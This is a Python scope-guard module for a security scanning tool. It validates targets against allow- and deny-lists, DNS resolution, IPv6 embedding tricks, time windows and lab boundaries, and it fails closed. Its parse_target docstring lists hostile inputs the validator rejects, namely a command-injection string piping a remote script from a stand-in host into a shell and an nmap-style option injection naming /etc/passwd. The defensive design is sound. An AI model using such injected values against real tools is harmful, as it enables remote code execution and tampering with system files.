"""Scope guard: decides whether a target may be scanned. Runs before every tool.

Implements SECURITY.md SBD-01 to SBD-06 and SBD-11/12:
- targets are validated strictly (IP, CIDR, hostname or http/https URL);
- every address is checked against the scope's deny-list, the always-deny list
  and the platform's own addresses, then against the allow-list;
- hostnames are resolved and every resolved IP is checked (stops DNS tricks);
- scans only run inside the scope's time window, after the authorisation time;
- in development mode, nothing outside the lab networks is ever allowed (SBD-07);
- in production mode, a platform deny inventory is required (SBD-02);
- any error blocks the target (fail closed), and every block is logged.

Example:
    scope = Scope(allow=["192.168.56.0/24"], deny=["192.168.56.1"], ...)
    allowed, blocked = check_targets(scope, ["192.168.56.104", "8.8.8.8"])
    # allowed -> [192.168.56.104], blocked -> [8.8.8.8: not in allow-list]
"""

from __future__ import annotations

import ipaddress
import json
import logging
import re
import socket
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Callable, Iterable
from urllib.parse import urlsplit

from cybrx import config

logger = logging.getLogger("cybrx.scope")

IPNetwork = ipaddress.IPv4Network | ipaddress.IPv6Network
IPAddress = ipaddress.IPv4Address | ipaddress.IPv6Address
Resolver = Callable[[str], list[str]]

# RFC 1123 hostname: labels of letters, digits and hyphens, not starting or ending with a hyphen.
_LABEL = r"(?!-)[A-Za-z0-9-]{1,63}(?<!-)"
_HOSTNAME_RE = re.compile(rf"^(?=.{{1,253}}$){_LABEL}(\.{_LABEL})*\.?$")


class InvalidTarget(ValueError):
    """The target string is not a valid IP, CIDR, hostname or http/https URL."""


@dataclass(frozen=True)
class Target:
    """A validated target.

    kind: "ip", "cidr", "hostname" or "url". host: the IP, CIDR or hostname to scope-check.
    Example: Target(raw="https://shop.example.com/x", kind="url", host="shop.example.com").
    """

    raw: str
    kind: str
    host: str


@dataclass(frozen=True)
class Scope:
    """What a group is authorised to scan, and when (CONVENTIONS.md §4).

    allow holds IPs and CIDRs only (ADR-002): a hostname target is allowed only when every
    address it resolves to is inside these networks. deny holds IPs, CIDRs or hostnames;
    denied hostnames are resolved, so their addresses are protected too. Example lab scope:
        Scope(allow=["192.168.56.0/24"], deny=["192.168.56.1", "192.168.56.100"],
              starts_at=..., ends_at=..., authorised_by="Lab owner", authorised_at=...)
    """

    allow: tuple[str, ...]
    deny: tuple[str, ...]
    starts_at: datetime
    ends_at: datetime
    authorised_by: str
    authorised_at: datetime

    def __post_init__(self) -> None:
        # Freeze the lists so a scope cannot be widened after it was authorised.
        object.__setattr__(self, "allow", tuple(self.allow))
        object.__setattr__(self, "deny", tuple(self.deny))
        for name in ("starts_at", "ends_at", "authorised_at"):
            if getattr(self, name).tzinfo is None:
                raise ValueError(f"{name} must be timezone-aware (UTC)")
        if not self.authorised_by.strip():
            raise ValueError("authorised_by is required (SBD-05)")
        if self.ends_at <= self.starts_at:
            raise ValueError("ends_at must be after starts_at")
        _split_entries(self.deny)  # validate deny entries now, not at first scan
        _, allow_hosts = _split_entries(self.allow)
        if allow_hosts:
            raise ValueError(
                f"allow-list must contain IPs/CIDRs only, got hostnames {sorted(allow_hosts)} "
                "(hostname authorisation needs ownership verification and IP pinning: ADR-002)"
            )


@dataclass(frozen=True)
class Decision:
    """The guard's answer for one target."""

    target: str
    allowed: bool
    reason: str
    resolved_ips: tuple[str, ...] = field(default=())
    # Runners must scan resolved_ips (not the hostname) so DNS cannot change between
    # this check and the scan. URL scans (Phase 4) need the same protection.


def default_resolver(hostname: str) -> list[str]:
    """Resolve a hostname to all of its IPv4 and IPv6 addresses."""
    infos = socket.getaddrinfo(hostname, None, proto=socket.IPPROTO_TCP)
    return sorted({info[4][0] for info in infos})


def parse_target(raw: str) -> Target:
    """Validate a target string and classify it. Raises InvalidTarget.

    Examples: "192.168.56.104" -> ip; "192.168.56.0/28" -> cidr;
    "mail.example.com" -> hostname; "https://shop.example.com" -> url;
    "10.0.0.1; curl evil.sh | sh" and "-oN /etc/passwd" -> InvalidTarget.
    """
    if not isinstance(raw, str):
        raise InvalidTarget("target must be a string")
    value = raw.strip()
    if not value or len(value) > config.MAX_TARGET_LENGTH:
        raise InvalidTarget("empty or too long")
    if value.startswith("-"):
        raise InvalidTarget("starts with '-' (option injection)")
    if any(ch.isspace() or ord(ch) < 32 or ord(ch) == 127 for ch in value):
        raise InvalidTarget("contains whitespace or control characters")

    if "://" in value:
        return _parse_url(value)
    if "/" in value:
        try:
            net = ipaddress.ip_network(value, strict=False)
        except ValueError as exc:
            raise InvalidTarget(f"invalid CIDR: {exc}") from None
        _reject_embedded_ipv4(net)
        return Target(raw=value, kind="cidr", host=str(net))
    try:
        ip = ipaddress.ip_address(value)
    except ValueError:
        ip = None
    if ip is not None:
        _reject_embedded_ipv4(ip)
        return Target(raw=value, kind="ip", host=str(ip))
    if _HOSTNAME_RE.match(value) and not value.replace(".", "").isdigit():
        return Target(raw=value, kind="hostname", host=value.rstrip(".").lower())
    raise InvalidTarget("not an IP, CIDR, hostname or http/https URL")


def _parse_url(value: str) -> Target:
    parts = urlsplit(value)
    if parts.scheme.lower() not in ("http", "https"):
        raise InvalidTarget("only http and https URLs are allowed")
    if parts.username is not None or parts.password is not None:
        raise InvalidTarget("credentials in URLs are not allowed")
    try:
        parts.port  # raises ValueError on a bad port
    except ValueError:
        raise InvalidTarget("invalid port") from None
    host = parts.hostname
    if not host:
        raise InvalidTarget("URL has no host")
    try:
        ip = ipaddress.ip_address(host)
    except ValueError:
        ip = None
    if ip is not None:
        _reject_embedded_ipv4(ip)
        return Target(raw=value, kind="url", host=str(ip))
    if not _HOSTNAME_RE.match(host):
        raise InvalidTarget("URL host is not a valid hostname")
    return Target(raw=value, kind="url", host=host.rstrip(".").lower())


# IPv6 forms that carry an IPv4 address inside them. Targets must use the plain IPv4 form,
# so a protected IPv4 address cannot be reached through an IPv6 spelling (finding 3).
_EMBEDDED_IPV4_NETS = tuple(
    ipaddress.ip_network(n)
    for n in (
        "::ffff:0:0/96",    # IPv4-mapped
        "::/96",            # IPv4-compatible (deprecated); "::" and "::1" are handled as always-deny
        "2002::/16",        # 6to4
        "2001::/32",        # Teredo
        "64:ff9b::/96",     # NAT64 well-known prefix
        "64:ff9b:1::/48",   # NAT64 local-use prefix
    )
)
# Network-specific NAT64 prefixes cannot be listed in code; the scanner egress firewall (SBD-22) covers them.
_UNSPECIFIED_AND_LOOPBACK = ipaddress.ip_network("::/127")


def _reject_embedded_ipv4(value: IPAddress | IPNetwork) -> None:
    """Raise InvalidTarget for IPv6 addresses/ranges that carry an IPv4 address inside them.

    Example: "::ffff:127.0.0.1" and "::ffff:127.0.0.1/128" -> InvalidTarget ("use the IPv4 form").
    """
    if value.version != 6:
        return
    if isinstance(value, ipaddress.IPv6Address):
        if value in _UNSPECIFIED_AND_LOOPBACK:
            return  # "::" and "::1": rejected later as always-deny, with a clearer reason
    elif value.subnet_of(_UNSPECIFIED_AND_LOOPBACK):
        return
    for net in _EMBEDDED_IPV4_NETS:
        inside = value in net if isinstance(value, ipaddress.IPv6Address) else value.overlaps(net)
        if inside:
            raise InvalidTarget(f"IPv6 form that embeds an IPv4 address ({net}); use the IPv4 form")


def _platform_hostname(hostname: str) -> bool:
    """True if hostname is a platform domain or a subdomain of one (finding 4)."""
    return any(hostname == p or hostname.endswith("." + p) for p in config.PLATFORM_DENY_HOSTNAMES)


def _protected_ips(deny_hosts: set[str], resolver: Resolver) -> set[IPAddress]:
    """Resolve denied hostnames and platform hostnames to the addresses they protect (finding 2).

    Raises if any name cannot be resolved: an unresolved deny entry means we cannot tell
    which addresses it protects, so the caller must fail closed.
    """
    protected: set[IPAddress] = set()
    for name in sorted(deny_hosts | set(config.PLATFORM_DENY_HOSTNAMES)):
        try:
            addresses = resolver(name)
        except Exception as exc:
            raise RuntimeError(f"could not resolve deny-list entry {name}: {exc}") from None
        if not addresses:
            raise RuntimeError(f"deny-list entry {name} did not resolve to any address")
        for a in addresses:
            ip = ipaddress.ip_address(a)
            protected.add(ip.ipv4_mapped if ip.version == 6 and ip.ipv4_mapped else ip)
    return protected


def _split_entries(entries: Iterable[str]) -> tuple[list[IPNetwork], set[str]]:
    """Split allow/deny entries into IP networks and hostnames.

    IPv6 spellings of IPv4 addresses are refused here too, so a deny entry like
    "::ffff:192.168.56.101/128" cannot silently fail to protect 192.168.56.101.
    """
    networks: list[IPNetwork] = []
    hostnames: set[str] = set()
    for entry in entries:
        entry = str(entry).strip()
        try:
            net = ipaddress.ip_network(entry, strict=False)
        except ValueError:
            if not _HOSTNAME_RE.match(entry) or entry.replace(".", "").isdigit():
                raise ValueError(f"invalid scope entry: {entry!r}") from None
            hostnames.add(entry.rstrip(".").lower())
            continue
        try:
            _reject_embedded_ipv4(net)
        except InvalidTarget as exc:
            raise ValueError(f"invalid scope entry {entry!r}: {exc}") from None
        networks.append(net)
    return networks, hostnames


def _denied_by(ip: IPAddress, deny: list[IPNetwork]) -> str | None:
    """Return why an address is denied, or None."""
    for net in config.ALWAYS_DENY_NETWORKS:
        if ip.version == net.version and ip in net:
            return f"{ip} is in always-deny range {net}"
    for net in config.PLATFORM_DENY_NETWORKS:
        if ip.version == net.version and ip in net:
            return f"{ip} belongs to the platform itself"
    for net in deny:
        if ip.version == net.version and ip in net:
            return f"{ip} is in the scope deny-list ({net})"
    return None


def _in_networks(ip: IPAddress, networks: list[IPNetwork]) -> bool:
    return any(ip.version == n.version and ip in n for n in networks)


def _check_network(net: IPNetwork, allow: list[IPNetwork], deny: list[IPNetwork]) -> str | None:
    """Return why a CIDR target is refused, or None if all of it is in scope."""
    if net.num_addresses > config.MAX_CIDR_ADDRESSES:
        return f"{net} has {net.num_addresses} addresses (max {config.MAX_CIDR_ADDRESSES})"
    blocked = list(config.ALWAYS_DENY_NETWORKS) + list(config.PLATFORM_DENY_NETWORKS)
    for bad in blocked:
        if net.version == bad.version and net.overlaps(bad):
            return f"{net} overlaps protected range {bad}"
    for bad in deny:
        if net.version == bad.version and net.overlaps(bad):
            return f"{net} overlaps the scope deny-list ({bad}); list allowed addresses separately"
    if not any(net.version == a.version and net.subnet_of(a) for a in allow):
        return f"{net} is not fully inside the allow-list"
    return None


def check_target(
    scope: Scope,
    raw: str,
    now: datetime | None = None,
    resolver: Resolver = default_resolver,
) -> Decision:
    """Decide whether one target may be scanned.

    Never raises: errors block the target (SBD-06). Every blocked target is logged here,
    so callers cannot skip the audit event (SBD-52).
    """
    try:
        decision = _check(scope, raw, now or datetime.now(timezone.utc), resolver)
    except Exception as exc:  # fail closed (SBD-06)
        decision = Decision(target=str(raw), allowed=False, reason=f"error during scope check: {exc}")
    if not decision.allowed:
        _log_block(scope, decision)
    return decision


def _outside_lab(value: IPAddress | IPNetwork) -> bool:
    """True in development mode when an address or range is outside the lab (SBD-07)."""
    if config.MODE != "development":
        return False
    if isinstance(value, (ipaddress.IPv4Network, ipaddress.IPv6Network)):
        return not any(value.version == n.version and value.subnet_of(n) for n in config.LAB_NETWORKS)
    return not any(value.version == n.version and value in n for n in config.LAB_NETWORKS)


def _check(scope: Scope, raw: str, now: datetime, resolver: Resolver) -> Decision:
    if now.tzinfo is None:
        raise ValueError("now must be timezone-aware")
    if config.MODE == "production" and not (
        config.PLATFORM_DENY_NETWORKS and config.PLATFORM_DENY_HOSTNAMES
    ):
        raise RuntimeError("production mode requires CYBRX_PLATFORM_DENY and "
                           "CYBRX_PLATFORM_DENY_HOSTNAMES (SBD-02)")
    if scope.authorised_at > now:
        return Decision(raw, False, "authorisation timestamp is in the future (SBD-05)")
    if not (scope.starts_at <= now <= scope.ends_at):
        return Decision(raw, False, "outside the authorised time window (SBD-04)")

    try:
        target = parse_target(raw)
    except InvalidTarget as exc:
        return Decision(str(raw), False, f"invalid target: {exc}")

    allow_nets, _ = _split_entries(scope.allow)
    deny_nets, deny_hosts = _split_entries(scope.deny)

    # Addresses behind denied hostnames and platform hostnames. Fails closed if one won't resolve.
    protected = _protected_ips(deny_hosts, resolver)

    if target.kind == "cidr":
        net = ipaddress.ip_network(target.host)
        reason = _check_network(net, allow_nets, deny_nets)
        if reason is None:
            hit = next((ip for ip in protected if ip.version == net.version and ip in net), None)
            if hit is not None:
                reason = f"{net} contains {hit}, protected by a deny-list hostname"
        if reason is None and _outside_lab(net):
            reason = f"{net} is outside the development lab boundary (SBD-07)"
        return Decision(raw, reason is None, reason or "in scope")

    try:
        ips = [ipaddress.ip_address(target.host)]
        hostname = None
    except ValueError:
        hostname = target.host
        if _platform_hostname(hostname):
            return Decision(raw, False, f"{hostname} belongs to the platform itself")
        if hostname in deny_hosts:
            return Decision(raw, False, f"{hostname} is in the scope deny-list")
        try:
            resolved = resolver(hostname)
        except Exception as exc:
            return Decision(raw, False, f"could not resolve {hostname}: {exc}")
        if not resolved:
            return Decision(raw, False, f"{hostname} did not resolve to any address")
        ips = [ipaddress.ip_address(r) for r in resolved]

    # Treat IPv4-mapped IPv6 (::ffff:127.0.0.1) as the IPv4 address it really is.
    ips = [ip.ipv4_mapped if ip.version == 6 and ip.ipv4_mapped else ip for ip in ips]
    resolved_strs = tuple(str(ip) for ip in ips) if hostname else ()

    for ip in ips:
        try:
            _reject_embedded_ipv4(ip)  # a hostname resolving to e.g. a 6to4 address
        except InvalidTarget as exc:
            return Decision(raw, False, f"{ip}: {exc}", resolved_strs)
        reason = _denied_by(ip, deny_nets)
        if reason:
            return Decision(raw, False, reason, resolved_strs)
        if ip in protected:
            return Decision(raw, False, f"{ip} is protected by a deny-list hostname", resolved_strs)

    # Strict IP policy (ADR-002): every address must be inside the allow-list, hostname or not.
    for ip in ips:
        if not _in_networks(ip, allow_nets):
            return Decision(raw, False, f"{ip} is not in the allow-list", resolved_strs)
        # Development mode: the lab boundary wins over any allow-list (SBD-07).
        if _outside_lab(ip):
            return Decision(raw, False, f"{ip} is outside the development lab boundary (SBD-07)",
                            resolved_strs)
    return Decision(raw, True, "in scope", resolved_strs)


def _redact(raw: object) -> str:
    """Make a target safe to log: no credentials, query strings or fragments (SBD-44).

    Example: "http://user:SECRET@host:8080/a?token=X" -> "http://host:8080/a".
    Never raises: an unparseable URL is logged as "<unparseable URL>".
    """
    text = str(raw)
    if "://" not in text:
        return text[:200]
    try:
        parts = urlsplit(text)
        host = parts.hostname or ""
        port = f":{parts.port}" if parts.port else ""
    except ValueError:
        return "<unparseable URL>"
    if ":" in host:
        host = f"[{host}]"
    return f"{parts.scheme}://{host}{port}{parts.path}"[:200]


def _log_block(scope: Scope, decision: Decision) -> None:
    """Write one audit line for a blocked target. Never raises."""
    try:
        logger.warning(json.dumps({
            "event": "target_blocked",
            "target": _redact(decision.target),
            "reason": decision.reason,
            "resolved_ips": list(decision.resolved_ips),
            "authorised_by": scope.authorised_by,
        }))
    except Exception:
        logger.warning('{"event": "target_blocked", "target": "<unloggable>"}')


def check_targets(
    scope: Scope,
    targets: Iterable[str],
    now: datetime | None = None,
    resolver: Resolver = default_resolver,
) -> tuple[list[Decision], list[Decision]]:
    """Check many targets. Returns (allowed, blocked); check_target logs every block."""
    allowed: list[Decision] = []
    blocked: list[Decision] = []
    for raw in targets:
        decision = check_target(scope, raw, now, resolver)
        (allowed if decision.allowed else blocked).append(decision)
    return allowed, blocked
